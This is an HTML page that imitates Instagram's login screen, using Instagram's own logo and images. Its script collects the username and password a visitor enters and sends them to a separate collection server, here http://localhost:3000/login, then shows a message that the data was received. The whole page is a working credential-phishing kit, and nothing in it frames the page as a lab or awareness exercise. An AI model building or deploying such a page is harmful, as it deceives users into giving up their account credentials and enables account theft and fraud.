<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/x-icon">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    </style>
</head>
<body class="bg-gray-50">
    <div class="container mx-auto flex items-center justify-center min-h-screen">
        <div class="grid grid-cols-1 md:grid-cols-2 items-center gap-8 max-w-4xl">
            <!-- Left Side: Phone Image (hidden on small screens) -->
            <div class="hidden md:block">
                <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png" alt="Instagram on a phone">
            </div>

            <!-- Right Side: Login Form -->
            <div class="w-full max-w-sm">
                <div class="bg-white border border-gray-300 rounded-lg p-8 text-center">
                    <!-- Instagram Logo -->
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="h-12 mx-auto mb-6">
                    
                    <form id="login-form">
                        <div class="space-y-2 mb-4">
                            <input type="text" id="username" placeholder="Phone number, username, or email" class="w-full px-2 py-2 border border-gray-300 rounded bg-gray-50 text-xs focus:outline-none focus:ring-1 focus:ring-gray-400" required>
                            <input type="password" id="password" placeholder="Password" class="w-full px-2 py-2 border border-gray-300 rounded bg-gray-50 text-xs focus:outline-none focus:ring-1 focus:ring-gray-400" required>
                        </div>
                        <button type="submit" class="w-full bg-blue-500 text-white font-semibold rounded py-1.5 hover:bg-blue-600 disabled:opacity-50">Log In</button>
                    </form>
                    
                    <!-- OR Separator -->
                    <div class="flex items-center my-6">
                        <div class="h-px bg-gray-300 flex-grow"></div>
                        <div class="px-4 text-xs font-semibold text-gray-500">OR</div>
                        <div class="h-px bg-gray-300 flex-grow"></div>
                    </div>

                    <!-- Log in with Facebook -->
                    <button class="text-blue-900 font-semibold text-sm">
                        Log in with Facebook
                    </button>
                    
                    <a href="#" class="block text-xs text-blue-900 mt-4">Forgot password?</a>

                    <div id="status-message" class="mt-4 text-sm"></div>
                </div>

                <div class="bg-white border border-gray-300 rounded-lg p-4 text-center mt-4 text-sm">
                    Don't have an account? <a href="#" class="text-blue-500 font-semibold">Sign up</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('login-form');
        const statusMessage = document.getElementById('status-message');

        form.addEventListener('submit', async (event) => {
            event.preventDefault();
            statusMessage.textContent = 'Logging in...';
            statusMessage.className = 'mt-4 text-sm text-gray-600';

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                const response = await fetch('http://localhost:3000/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password }),
                });

                if (response.ok) {
                    statusMessage.textContent = 'Success! Data received by server.';
                    statusMessage.className = 'mt-4 text-sm text-green-600';
                } else {
                    const errorText = await response.text();
                    statusMessage.textContent = `Error: ${errorText}`;
                    statusMessage.className = 'mt-4 text-sm text-red-600';
                }
            } catch (error) {
                console.error('Fetch error:', error);
                statusMessage.textContent = 'Failed to connect to the server. Is it running?';
                statusMessage.className = 'mt-4 text-sm text-red-600';
            }
        });
    </script>
</body>
</html>
